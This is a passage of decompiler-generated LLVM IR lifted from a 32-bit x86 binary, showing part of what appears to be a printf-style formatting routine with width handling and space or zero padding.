  %v0_804c3c9 = call i32 @function_804fcd0()
  store i32 %v0_804c3c9, i32* %eax.global-to-local, align 4
  %v0_804c3ce = load i32, i32* @esp, align 4
  %v1_804c3ce = add i32 %v0_804c3ce, 32
  %v2_804c3d1 = icmp slt i32 %v0_804c3c9, 0
  store i1 %v2_804c3d1, i1* %sf.global-to-local, align 1
  br i1 %v2_804c3d1, label %dec_label_pc_804c67f, label %dec_label_pc_804c3d9

dec_label_pc_804c3d9:                             ; preds = %dec_label_pc_804c3b0
  %v1_804c3d9 = inttoptr i32 %v1_804c3ce to i32*
  %v2_804c3d9 = load i32, i32* %v1_804c3d9, align 4
  %v4_804c3d9 = add i32 %v2_804c3d9, %v0_804c3c9
  %v15_804c3d9 = icmp slt i32 %v4_804c3d9, 0
  store i1 %v15_804c3d9, i1* %sf.global-to-local, align 1
  store i32 %v4_804c3d9, i32* %v1_804c3d9, align 4
  %v0_804c66c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c66c

dec_label_pc_804c3e1:                             ; preds = %dec_label_pc_804c397
  %v1_804c3e1 = add i32 %v3_804c1fc, -17
  %v5_804c3e1 = icmp ult i32 %v3_804c1fc, 17
  %v9_804c3e1 = icmp eq i32 %v1_804c3e1, 0
  %v10_804c3e1 = icmp slt i32 %v1_804c3e1, 0
  store i1 %v10_804c3e1, i1* %sf.global-to-local, align 1
  %v2_804c3e4 = or i1 %v5_804c3e1, %v9_804c3e1
  br i1 %v2_804c3e4, label %dec_label_pc_804c3ea, label %dec_label_pc_804c47e

dec_label_pc_804c3ea:                             ; preds = %dec_label_pc_804c3e1
  %v1_804c3ea = add i32 %v0_804c1fc.lcssa, 332
  %v2_804c3ea = inttoptr i32 %v1_804c3ea to i32*
  store i32 0, i32* %v2_804c3ea, align 4
  %v0_804c3f5 = load i32, i32* @esp, align 4
  %v1_804c3f5 = add i32 %v0_804c3f5, 344
  %v2_804c3f5 = inttoptr i32 %v1_804c3f5 to i32*
  %v3_804c3f5 = load i32, i32* %v2_804c3f5, align 4
  store i32 %v3_804c3f5, i32* %edx.global-to-local, align 4
  %v1_804c3fc = icmp eq i1 %v9_804c3e1, false
  br i1 %v1_804c3fc, label %dec_label_pc_804c44e, label %dec_label_pc_804c3fe

dec_label_pc_804c3fe:                             ; preds = %dec_label_pc_804c3ea
  %v1_804c3fe = inttoptr i32 %v3_804c3f5 to i32*
  %v2_804c3fe = load i32, i32* %v1_804c3fe, align 4
  store i32 %v2_804c3fe, i32* %eax.global-to-local, align 4
  %v1_804c400 = icmp eq i32 %v2_804c3fe, 0
  %v2_804c400 = icmp slt i32 %v2_804c3fe, 0
  store i1 %v2_804c400, i1* %sf.global-to-local, align 1
  %v2_804c402 = add i32 %v0_804c3f5, 340
  %v3_804c402 = inttoptr i32 %v2_804c402 to i32*
  store i32 %v2_804c3fe, i32* %v3_804c402, align 4
  br i1 %v1_804c400, label %dec_label_pc_804c509, label %dec_label_pc_804c40f

dec_label_pc_804c40f:                             ; preds = %dec_label_pc_804c3fe
  %v0_804c40f = load i32, i32* @esp, align 4
  %v1_804c40f = add i32 %v0_804c40f, 20
  %v2_804c40f = inttoptr i32 %v1_804c40f to i32*
  %v3_804c40f = load i32, i32* %v2_804c40f, align 4
  %v1_804c416 = add i32 %v0_804c40f, 340
  store i32 %v1_804c416, i32* %ecx.global-to-local, align 4
  %v2_804c41d = icmp slt i32 %v3_804c40f, 0
  store i1 %v2_804c41d, i1* %sf.global-to-local, align 1
  %v1_804c41f = icmp eq i1 %v2_804c41d, false
  %v4_804c41f = select i1 %v1_804c41f, i32 %v3_804c40f, i32 -1
  store i32 %v4_804c41f, i32* %edx.global-to-local, align 4
  %v1_804c422 = add i32 %v0_804c40f, 332
  store i32 %v1_804c422, i32* %eax.global-to-local, align 4
  %v2_804c429 = add i32 %v0_804c40f, -4
  %v3_804c429 = inttoptr i32 %v2_804c429 to i32*
  store i32 %v1_804c422, i32* %v3_804c429, align 4
  %v0_804c42a = load i32, i32* %edx.global-to-local, align 4
  %v2_804c42a = add i32 %v0_804c40f, -8
  %v3_804c42a = inttoptr i32 %v2_804c42a to i32*
  store i32 %v0_804c42a, i32* %v3_804c42a, align 4
  %v0_804c42b = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c42b = add i32 %v0_804c40f, -12
  %v3_804c42b = inttoptr i32 %v2_804c42b to i32*
  store i32 %v0_804c42b, i32* %v3_804c42b, align 4
  %v0_804c42c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c42c = add i32 %v0_804c40f, -16
  %v3_804c42c = inttoptr i32 %v2_804c42c to i32*
  store i32 %v0_804c42c, i32* %v3_804c42c, align 4
  %v0_804c42d = call i32 @function_804f878()
  store i32 %v0_804c42d, i32* %eax.global-to-local, align 4
  %v0_804c432 = load i32, i32* @esp, align 4
  %v1_804c432 = add i32 %v0_804c432, 16
  %v1_804c435 = add i32 %v0_804c42d, 1
  %v10_804c435 = icmp eq i32 %v1_804c435, 0
  %v11_804c435 = icmp slt i32 %v1_804c435, 0
  store i1 %v11_804c435, i1* %sf.global-to-local, align 1
  store i32 %v0_804c42d, i32* @esi, align 4
  br i1 %v10_804c435, label %dec_label_pc_804c67f, label %dec_label_pc_804c440

dec_label_pc_804c440:                             ; preds = %dec_label_pc_804c40f
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804c51a

dec_label_pc_804c44e:                             ; preds = %dec_label_pc_804c3ea
  %v0_804c44e = load i32, i32* @ebx, align 4
  %v2_804c44e = add i32 %v0_804c3f5, -4
  %v3_804c44e = inttoptr i32 %v2_804c44e to i32*
  store i32 %v0_804c44e, i32* %v3_804c44e, align 4
  %v1_804c44f = add i32 %v0_804c3f5, 332
  store i32 %v1_804c44f, i32* %eax.global-to-local, align 4
  %v2_804c456 = add i32 %v0_804c3f5, -8
  %v3_804c456 = inttoptr i32 %v2_804c456 to i32*
  store i32 %v1_804c44f, i32* %v3_804c456, align 4
  %v0_804c457 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c457 = inttoptr i32 %v0_804c457 to i32*
  %v2_804c457 = load i32, i32* %v1_804c457, align 4
  %v4_804c457 = add i32 %v0_804c3f5, -12
  %v5_804c457 = inttoptr i32 %v4_804c457 to i32*
  store i32 %v2_804c457, i32* %v5_804c457, align 4
  %v1_804c459 = add i32 %v0_804c3f5, 204
  store i32 %v1_804c459, i32* @edi, align 4
  %v2_804c460 = add i32 %v0_804c3f5, -16
  %v3_804c460 = inttoptr i32 %v2_804c460 to i32*
  store i32 %v1_804c459, i32* %v3_804c460, align 4
  %v0_804c461 = call i32 @function_804f830()
  store i32 %v0_804c461, i32* %eax.global-to-local, align 4
  %v0_804c466 = load i32, i32* @esp, align 4
  %v1_804c466 = add i32 %v0_804c466, 16
  %v1_804c469 = add i32 %v0_804c461, 1
  %v10_804c469 = icmp eq i32 %v1_804c469, 0
  %v11_804c469 = icmp slt i32 %v1_804c469, 0
  store i1 %v11_804c469, i1* %sf.global-to-local, align 1
  store i32 %v0_804c461, i32* @esi, align 4
  br i1 %v10_804c469, label %dec_label_pc_804c67f, label %dec_label_pc_804c474

dec_label_pc_804c474:                             ; preds = %dec_label_pc_804c44e
  %v2_804c474 = add i32 %v0_804c461, 220
  %v3_804c474 = add i32 %v2_804c474, %v0_804c466
  %v4_804c474 = inttoptr i32 %v3_804c474 to i8*
  store i8 0, i8* %v4_804c474, align 1
  br label %dec_label_pc_804c4ac

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c3e1
  %v1_804c47e = add i32 %v3_804c1fc, -19
  %v5_804c47e = icmp ult i32 %v3_804c1fc, 19
  %v9_804c47e = icmp eq i32 %v1_804c47e, 0
  %v10_804c47e = icmp slt i32 %v1_804c47e, 0
  store i1 %v10_804c47e, i1* %sf.global-to-local, align 1
  %v2_804c481 = or i1 %v5_804c47e, %v9_804c47e
  br i1 %v2_804c481, label %dec_label_pc_804c483, label %dec_label_pc_804c4db

dec_label_pc_804c483:                             ; preds = %dec_label_pc_804c47e
  %v1_804c483 = add i32 %v0_804c1fc.lcssa, 344
  %v2_804c483 = inttoptr i32 %v1_804c483 to i32*
  %v3_804c483 = load i32, i32* %v2_804c483, align 4
  store i32 %v3_804c483, i32* %edx.global-to-local, align 4
  %v1_804c48a = icmp eq i1 %v9_804c47e, false
  %v1_804c4b5 = inttoptr i32 %v3_804c483 to i32*
  %v2_804c4b5 = load i32, i32* %v1_804c4b5, align 4
  br i1 %v1_804c48a, label %dec_label_pc_804c4b5, label %dec_label_pc_804c48c

dec_label_pc_804c48c:                             ; preds = %dec_label_pc_804c483
  store i32 %v2_804c4b5, i32* @edi, align 4
  %v1_804c48e = icmp eq i32 %v2_804c4b5, 0
  %v2_804c48e = icmp slt i32 %v2_804c4b5, 0
  store i1 %v2_804c48e, i1* %sf.global-to-local, align 1
  br i1 %v1_804c48e, label %dec_label_pc_804c509, label %dec_label_pc_804c492

dec_label_pc_804c492:                             ; preds = %dec_label_pc_804c48c, %dec_label_pc_804c4e4
  %v1_804c499 = phi i32 [ %v0_804c1fc.lcssa, %dec_label_pc_804c48c ], [ %v1_804c4fe, %dec_label_pc_804c4e4 ]
  %v1_804c492 = add i32 %v1_804c499, 20
  %v2_804c492 = inttoptr i32 %v1_804c492 to i32*
  %v3_804c492 = load i32, i32* %v2_804c492, align 4
  store i32 %v3_804c492, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804c499 = add i32 %v1_804c499, -4
  %v3_804c499 = inttoptr i32 %v2_804c499 to i32*
  store i32 %v3_804c1fc, i32* %v3_804c499, align 4
  %v2_804c49a = add i32 %v1_804c499, -8
  %v3_804c49a = inttoptr i32 %v2_804c49a to i32*
  store i32 %v3_804c1fc, i32* %v3_804c49a, align 4
  %v2_804c49b = icmp slt i32 %v3_804c492, 0
  store i1 %v2_804c49b, i1* %sf.global-to-local, align 1
  %v1_804c49d = icmp eq i1 %v2_804c49b, false
  %v2_804c49d = load i32, i32* %eax.global-to-local, align 4
  %v4_804c49d = select i1 %v1_804c49d, i32 %v3_804c492, i32 %v2_804c49d
  store i32 %v4_804c49d, i32* %eax.global-to-local, align 4
  %v2_804c4a0 = add i32 %v1_804c499, -12
  %v3_804c4a0 = inttoptr i32 %v2_804c4a0 to i32*
  store i32 %v4_804c49d, i32* %v3_804c4a0, align 4
  %v0_804c4a1 = load i32, i32* @edi, align 4
  %v2_804c4a1 = add i32 %v1_804c499, -16
  %v3_804c4a1 = inttoptr i32 %v2_804c4a1 to i32*
  store i32 %v0_804c4a1, i32* %v3_804c4a1, align 4
  %v0_804c4a2 = call i32 @function_804d240()
  store i32 %v0_804c4a2, i32* %eax.global-to-local, align 4
  %v0_804c4a7 = load i32, i32* @esp, align 4
  %v1_804c4a7 = add i32 %v0_804c4a7, 16
  %v7_804c4a7 = icmp slt i32 %v1_804c4a7, 0
  store i1 %v7_804c4a7, i1* %sf.global-to-local, align 1
  store i32 %v0_804c4a2, i32* @esi, align 4
  br label %dec_label_pc_804c4ac

dec_label_pc_804c4ac:                             ; preds = %dec_label_pc_804c474, %dec_label_pc_804c492
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804c51a

dec_label_pc_804c4b5:                             ; preds = %dec_label_pc_804c483
  store i32 %v2_804c4b5, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804c4c3 = add i32 %v0_804c1fc.lcssa, 204
  store i32 %v1_804c4c3, i32* @edi, align 4
  %v1_804c4ca = add i32 %v0_804c1fc.lcssa, 205
  %v2_804c4ca = inttoptr i32 %v1_804c4ca to i8*
  store i8 0, i8* %v2_804c4ca, align 1
  %v0_804c4d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4d2 = trunc i32 %v0_804c4d2 to i8
  %v2_804c4d2 = load i32, i32* @esp, align 4
  %v3_804c4d2 = add i32 %v2_804c4d2, 204
  %v4_804c4d2 = inttoptr i32 %v3_804c4d2 to i8*
  store i8 %v1_804c4d2, i8* %v4_804c4d2, align 1
  br label %dec_label_pc_804c51a

dec_label_pc_804c4db:                             ; preds = %dec_label_pc_804c47e
  %v1_804c4db = add i32 %v3_804c1fc, -20
  %v9_804c4db = icmp eq i32 %v1_804c4db, 0
  %v10_804c4db = icmp slt i32 %v1_804c4db, 0
  store i1 %v10_804c4db, i1* %sf.global-to-local, align 1
  %v1_804c4de = icmp eq i1 %v9_804c4db, false
  br i1 %v1_804c4de, label %dec_label_pc_804c67f, label %dec_label_pc_804c4e4

dec_label_pc_804c4e4:                             ; preds = %dec_label_pc_804c4db
  %v0_804c4e4 = load i32, i32* %stack_var_-364, align 4
  %v1_804c4e4 = call i32 @function_804b7f4(i32 %v0_804c4e4)
  store i32 %v1_804c4e4, i32* %eax.global-to-local, align 4
  %v0_804c4e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c4e9 = load i32, i32* @esp, align 4
  %v2_804c4e9 = add i32 %v1_804c4e9, -4
  %v3_804c4e9 = inttoptr i32 %v2_804c4e9 to i32*
  store i32 %v0_804c4e9, i32* %v3_804c4e9, align 4
  %v1_804c4ea = add i32 %v1_804c4e9, -8
  %v2_804c4ea = inttoptr i32 %v1_804c4ea to i32*
  store i32 128, i32* %v2_804c4ea, align 4
  %v1_804c4ef = add i32 %v1_804c4e9, 204
  store i32 %v1_804c4ef, i32* %edx.global-to-local, align 4
  %v2_804c4f6 = add i32 %v1_804c4e9, -12
  %v3_804c4f6 = inttoptr i32 %v2_804c4f6 to i32*
  store i32 %v1_804c4ef, i32* %v3_804c4f6, align 4
  %v1_804c4f7 = inttoptr i32 %v1_804c4e4 to i32*
  %v2_804c4f7 = load i32, i32* %v1_804c4f7, align 4
  %v4_804c4f7 = add i32 %v1_804c4e9, -16
  %v5_804c4f7 = inttoptr i32 %v4_804c4f7 to i32*
  store i32 %v2_804c4f7, i32* %v5_804c4f7, align 4
  %v0_804c4f9 = call i32 @function_804d25c()
  store i32 %v0_804c4f9, i32* %eax.global-to-local, align 4
  %v0_804c4fe = load i32, i32* @esp, align 4
  %v1_804c4fe = add i32 %v0_804c4fe, 16
  %v7_804c4fe = icmp slt i32 %v1_804c4fe, 0
  store i1 %v7_804c4fe, i1* %sf.global-to-local, align 1
  store i32 %v0_804c4f9, i32* @edi, align 4
  br label %dec_label_pc_804c492

dec_label_pc_804c505:                             ; preds = %dec_label_pc_804c386, %dec_label_pc_804c37f, %dec_label_pc_804c36c
  %v0_804c52234 = phi i32 [ %v1_804c315, %dec_label_pc_804c386 ], [ 0, %dec_label_pc_804c37f ], [ 5, %dec_label_pc_804c36c ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c51f

dec_label_pc_804c509:                             ; preds = %dec_label_pc_804c48c, %dec_label_pc_804c3fe
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80533ea.120 to i32), i32* @edi, align 4
  br label %dec_label_pc_804c51a

dec_label_pc_804c51a:                             ; preds = %dec_label_pc_804c4b5, %dec_label_pc_804c4ac, %dec_label_pc_804c440, %dec_label_pc_804c509
  %v0_804c51a = load i32, i32* @esp, align 4
  %v1_804c51a = add i32 %v0_804c51a, 7
  %v2_804c51a = inttoptr i32 %v1_804c51a to i8*
  store i8 32, i8* %v2_804c51a, align 1
  %v0_804c522.pre = load i32, i32* @esi, align 4
  %v1_804c522.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c51f

dec_label_pc_804c51f:                             ; preds = %dec_label_pc_804c505, %dec_label_pc_804c38e, %dec_label_pc_804c51a
  %v1_804c522 = phi i32 [ 0, %dec_label_pc_804c505 ], [ %v2_804c386, %dec_label_pc_804c38e ], [ %v1_804c522.pre, %dec_label_pc_804c51a ]
  %v0_804c522 = phi i32 [ %v0_804c52234, %dec_label_pc_804c505 ], [ %v1_804c315, %dec_label_pc_804c38e ], [ %v0_804c522.pre, %dec_label_pc_804c51a ]
  %v0_804c51f = load i32, i32* @ebp, align 4
  %v1_804c51f = add i32 %v0_804c51f, -11
  %v9_804c51f = icmp eq i32 %v1_804c51f, 0
  %v10_804c51f = icmp slt i32 %v1_804c51f, 0
  store i1 %v10_804c51f, i1* %sf.global-to-local, align 1
  %v2_804c522 = add i32 %v0_804c522, %v1_804c522
  store i32 %v2_804c522, i32* @edx, align 4
  br i1 %v9_804c51f, label %dec_label_pc_804c533, label %dec_label_pc_804c527

dec_label_pc_804c527:                             ; preds = %dec_label_pc_804c51f
  %v1_804c529 = add i32 %v0_804c51f, -5
  %v6_804c529 = sub i32 4, %v0_804c51f
  %v7_804c529 = and i32 %v6_804c529, %v0_804c51f
  %v8_804c529 = icmp slt i32 %v7_804c529, 0
  %v9_804c529 = icmp eq i32 %v1_804c529, 0
  %v10_804c529 = icmp slt i32 %v1_804c529, 0
  store i1 %v10_804c529, i1* %sf.global-to-local, align 1
  %v3_804c52c = icmp eq i1 %v10_804c529, %v8_804c529
  %v4_804c52c = icmp eq i1 %v9_804c529, false
  %v5_804c52c = and i1 %v4_804c52c, %v3_804c52c
  %v6_804c52c = zext i1 %v5_804c52c to i32
  store i32 %v6_804c52c, i32* %eax.global-to-local, align 4
  %v2_804c52f = add i32 %v2_804c522, 1
  %v3_804c52f = add i32 %v2_804c52f, %v6_804c52c
  store i32 %v3_804c52f, i32* @edx, align 4
  br label %dec_label_pc_804c533

dec_label_pc_804c533:                             ; preds = %dec_label_pc_804c51f, %dec_label_pc_804c527
  %v0_804c533 = load i32, i32* @esp, align 4
  %v1_804c533 = add i32 %v0_804c533, 24
  %v2_804c533 = inttoptr i32 %v1_804c533 to i32*
  %v3_804c533 = load i32, i32* %v2_804c533, align 4
  store i32 %v3_804c533, i32* %eax.global-to-local, align 4
  %v1_804c537 = add i32 %v0_804c533, 8
  %v2_804c537 = inttoptr i32 %v1_804c537 to i32*
  store i32 0, i32* %v2_804c537, align 4
  %v0_804c53f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c53f = load i32, i32* @edx, align 4
  %v2_804c53f = sub i32 %v0_804c53f, %v1_804c53f
  %v7_804c53f = icmp ult i32 %v0_804c53f, %v1_804c53f
  %v12_804c53f = icmp eq i32 %v2_804c53f, 0
  %v13_804c53f = icmp slt i32 %v2_804c53f, 0
  store i1 %v13_804c53f, i1* %sf.global-to-local, align 1
  %v2_804c541 = or i1 %v7_804c53f, %v12_804c53f
  br i1 %v2_804c541, label %dec_label_pc_804c549, label %dec_label_pc_804c543

dec_label_pc_804c543:                             ; preds = %dec_label_pc_804c533
  store i1 %v13_804c53f, i1* %sf.global-to-local, align 1
  store i32 %v2_804c53f, i32* %eax.global-to-local, align 4
  %v1_804c545 = load i32, i32* @esp, align 4
  %v2_804c545 = add i32 %v1_804c545, 8
  %v3_804c545 = inttoptr i32 %v2_804c545 to i32*
  store i32 %v2_804c53f, i32* %v3_804c545, align 4
  %v0_804c54d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c549

dec_label_pc_804c549:                             ; preds = %dec_label_pc_804c533, %dec_label_pc_804c543
  %v0_804c54d = phi i32 [ %v1_804c53f, %dec_label_pc_804c533 ], [ %v0_804c54d.pre, %dec_label_pc_804c543 ]
  %v0_804c549 = load i32, i32* @esp, align 4
  %v1_804c549 = add i32 %v0_804c549, 8
  %v2_804c549 = inttoptr i32 %v1_804c549 to i32*
  %v3_804c549 = load i32, i32* %v2_804c549, align 4
  store i32 %v3_804c549, i32* %ecx.global-to-local, align 4
  %v2_804c54d = add i32 %v3_804c549, %v0_804c54d
  store i32 %v2_804c54d, i32* %eax.global-to-local, align 4
  %v1_804c550 = inttoptr i32 %v0_804c549 to i32*
  %v2_804c550 = load i32, i32* %v1_804c550, align 4
  %v4_804c550 = add i32 %v2_804c550, %v2_804c54d
  %v15_804c550 = icmp slt i32 %v4_804c550, 0
  store i1 %v15_804c550, i1* %sf.global-to-local, align 1
  store i32 %v4_804c550, i32* %v1_804c550, align 4
  %v0_804c553 = load i32, i32* @esp, align 4
  %v1_804c553 = add i32 %v0_804c553, 7
  %v2_804c553 = inttoptr i32 %v1_804c553 to i8*
  %v3_804c553 = load i8, i8* %v2_804c553, align 1
  %v4_804c553 = add i8 %v3_804c553, -48
  %v9_804c553 = icmp eq i8 %v4_804c553, 0
  %v10_804c553 = icmp slt i8 %v4_804c553, 0
  store i1 %v10_804c553, i1* %sf.global-to-local, align 1
  %v1_804c558 = icmp eq i1 %v9_804c553, false
  br i1 %v1_804c558, label %dec_label_pc_804c564, label %dec_label_pc_804c55a

dec_label_pc_804c55a:                             ; preds = %dec_label_pc_804c549
  %v0_804c55a = load i32, i32* @ebx, align 4
  %v1_804c55a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c55a = add i32 %v1_804c55a, %v0_804c55a
  %v13_804c55a = icmp slt i32 %v2_804c55a, 0
  store i1 %v13_804c55a, i1* %sf.global-to-local, align 1
  store i32 %v2_804c55a, i32* @ebx, align 4
  %v1_804c55c = add i32 %v0_804c553, 8
  %v2_804c55c = inttoptr i32 %v1_804c55c to i32*
  store i32 0, i32* %v2_804c55c, align 4
  %v0_804c564.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c564

dec_label_pc_804c564:                             ; preds = %dec_label_pc_804c549, %dec_label_pc_804c55a
  %v0_804c56b = phi i32 [ %v0_804c553, %dec_label_pc_804c549 ], [ %v0_804c564.pre, %dec_label_pc_804c55a ]
  %v1_804c564 = add i32 %v0_804c56b, 32
  %v2_804c564 = inttoptr i32 %v1_804c564 to i8*
  %v3_804c564 = load i8, i8* %v2_804c564, align 1
  %v4_804c564 = and i8 %v3_804c564, 8
  %v5_804c564 = icmp eq i8 %v4_804c564, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c569 = icmp eq i1 %v5_804c564, false
  br i1 %v1_804c569, label %dec_label_pc_804c592, label %dec_label_pc_804c56b

dec_label_pc_804c56b:                             ; preds = %dec_label_pc_804c564
  %v1_804c56b = add i32 %v0_804c56b, 8
  %v2_804c56b = inttoptr i32 %v1_804c56b to i32*
  %v3_804c56b = load i32, i32* %v2_804c56b, align 4
  store i32 %v3_804c56b, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c574 = add i32 %v0_804c56b, 368
  %v2_804c574 = inttoptr i32 %v1_804c574 to i32*
  %v3_804c574 = load i32, i32* %v2_804c574, align 4
  store i32 %v3_804c574, i32* @eax, align 4
  %v0_804c57b = call i32 @function_804c03c()
  store i32 %v0_804c57b, i32* %eax.global-to-local, align 4
  %v1_804c580 = load i32, i32* @esp, align 4
  %v2_804c580 = add i32 %v1_804c580, 8
  %v3_804c580 = inttoptr i32 %v2_804c580 to i32*
  %v4_804c580 = load i32, i32* %v3_804c580, align 4
  %v5_804c580 = sub i32 %v0_804c57b, %v4_804c580
  %v15_804c580 = icmp eq i32 %v5_804c580, 0
  %v16_804c580 = icmp slt i32 %v5_804c580, 0
  store i1 %v16_804c580, i1* %sf.global-to-local, align 1
  %v1_804c584 = icmp eq i1 %v15_804c580, false
  br i1 %v1_804c584, label %dec_label_pc_804c67f, label %dec_label_pc_804c58a

dec_label_pc_804c58a:                             ; preds = %dec_label_pc_804c56b
  store i32 0, i32* %v3_804c580, align 4
  %v1_804c592.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c592

dec_label_pc_804c592:                             ; preds = %dec_label_pc_804c564, %dec_label_pc_804c58a
  %v1_804c592 = phi i32 [ %v0_804c56b, %dec_label_pc_804c564 ], [ %v1_804c592.pre, %dec_label_pc_804c58a ]
  %v0_804c592 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c592 = add i32 %v1_804c592, -4
  %v3_804c592 = inttoptr i32 %v2_804c592 to i32*
  store i32 %v0_804c592, i32* %v3_804c592, align 4
  %v0_804c593 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c593 = add i32 %v1_804c592, -8
  %v3_804c593 = inttoptr i32 %v2_804c593 to i32*
  store i32 %v0_804c593, i32* %v3_804c593, align 4
  %v1_804c594 = add i32 %v1_804c592, 368
  %v2_804c594 = inttoptr i32 %v1_804c594 to i32*
  %v3_804c594 = load i32, i32* %v2_804c594, align 4
  %v5_804c594 = add i32 %v1_804c592, -12
  %v6_804c594 = inttoptr i32 %v5_804c594 to i32*
  store i32 %v3_804c594, i32* %v6_804c594, align 4
  %v0_804c59b = load i32, i32* @ebp, align 4
  %v1_804c59b = add i32 %v0_804c59b, ptrtoint (i32* @global_var_80533f1.121 to i32)
  store i32 %v1_804c59b, i32* %eax.global-to-local, align 4
  %v2_804c5a1 = add i32 %v1_804c592, -16
  %v3_804c5a1 = inttoptr i32 %v2_804c5a1 to i32*
  store i32 %v1_804c59b, i32* %v3_804c5a1, align 4
  %v0_804c5a2 = call i32 @function_804d0fc()
  store i32 %v0_804c5a2, i32* %eax.global-to-local, align 4
  %v0_804c5a7 = load i32, i32* @esp, align 4
  %v1_804c5a7 = add i32 %v0_804c5a7, 384
  %v2_804c5a7 = inttoptr i32 %v1_804c5a7 to i32*
  %v3_804c5a7 = load i32, i32* %v2_804c5a7, align 4
  store i32 %v3_804c5a7, i32* @eax, align 4
  %v0_804c5ae = load i32, i32* @ebx, align 4
  store i32 %v0_804c5ae, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804c5b5 = call i32 @function_804c03c()
  store i32 %v0_804c5b5, i32* %eax.global-to-local, align 4
  %v0_804c5ba = load i32, i32* @esp, align 4
  %v1_804c5ba = add i32 %v0_804c5ba, 16
  %v1_804c5bd = load i32, i32* @ebx, align 4
  %v2_804c5bd = sub i32 %v0_804c5b5, %v1_804c5bd
  %v12_804c5bd = icmp eq i32 %v2_804c5bd, 0
  %v13_804c5bd = icmp slt i32 %v2_804c5bd, 0
  store i1 %v13_804c5bd, i1* %sf.global-to-local, align 1
  %v1_804c5bf = icmp eq i1 %v12_804c5bd, false
  br i1 %v1_804c5bf, label %dec_label_pc_804c67f, label %dec_label_pc_804c5c5

dec_label_pc_804c5c5:                             ; preds = %dec_label_pc_804c592
  %v1_804c5c5 = add i32 %v0_804c5ba, 356
  %v2_804c5c5 = inttoptr i32 %v1_804c5c5 to i32*
  %v3_804c5c5 = load i32, i32* %v2_804c5c5, align 4
  %v4_804c5c5 = icmp eq i32 %v3_804c5c5, 0
  %v5_804c5c5 = icmp slt i32 %v3_804c5c5, 0
  store i1 %v5_804c5c5, i1* %sf.global-to-local, align 1
  %v1_804c5cd = icmp eq i1 %v4_804c5c5, false
  br i1 %v1_804c5cd, label %dec_label_pc_804c5f1, label %dec_label_pc_804c5cf

dec_label_pc_804c5cf:                             ; preds = %dec_label_pc_804c5c5
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804c5d1 = load i32, i32* @esi, align 4
  %v1_804c5d1 = icmp eq i32 %v0_804c5d1, 0
  %v2_804c5d1 = icmp slt i32 %v0_804c5d1, 0
  store i1 %v2_804c5d1, i1* %sf.global-to-local, align 1
  br i1 %v1_804c5d1, label %dec_label_pc_804c5e7, label %dec_label_pc_804c5d5

dec_label_pc_804c5d5:                             ; preds = %dec_label_pc_804c5cf
  %v2_804c5d5 = add i32 %v0_804c5ba, 12
  %v3_804c5d5 = inttoptr i32 %v2_804c5d5 to i32*
  store i32 0, i32* %v3_804c5d5, align 4
  %v1_804c5d6 = add i32 %v0_804c5ba, 384
  %v2_804c5d6 = inttoptr i32 %v1_804c5d6 to i32*
  %v3_804c5d6 = load i32, i32* %v2_804c5d6, align 4
  %v5_804c5d6 = add i32 %v0_804c5ba, 8
  %v6_804c5d6 = inttoptr i32 %v5_804c5d6 to i32*
  store i32 %v3_804c5d6, i32* %v6_804c5d6, align 4
  %v0_804c5dd = load i32, i32* @esi, align 4
  %v2_804c5dd = add i32 %v0_804c5ba, 4
  %v3_804c5dd = inttoptr i32 %v2_804c5dd to i32*
  store i32 %v0_804c5dd, i32* %v3_804c5dd, align 4
  %v0_804c5de = load i32, i32* @edi, align 4
  %v3_804c5de = inttoptr i32 %v0_804c5ba to i32*
  store i32 %v0_804c5de, i32* %v3_804c5de, align 4
  %v0_804c5df = load i32, i32* %stack_var_-364, align 4
  %v4_804c5df = call i32 @function_804f9d4(i32 %v0_804c5df, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c5df, i32* %eax.global-to-local, align 4
  %v0_804c5e4 = load i32, i32* @esp, align 4
  %v1_804c5e4 = add i32 %v0_804c5e4, 16
  %v7_804c5e4 = icmp slt i32 %v1_804c5e4, 0
  store i1 %v7_804c5e4, i1* %sf.global-to-local, align 1
  %v1_804c5e7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c5e7

dec_label_pc_804c5e7:                             ; preds = %dec_label_pc_804c5cf, %dec_label_pc_804c5d5
  %v0_804c65146 = phi i32 [ %v1_804c5ba, %dec_label_pc_804c5cf ], [ %v1_804c5e4, %dec_label_pc_804c5d5 ]
  %v1_804c5e7 = phi i32 [ 0, %dec_label_pc_804c5cf ], [ %v1_804c5e7.pre, %dec_label_pc_804c5d5 ]
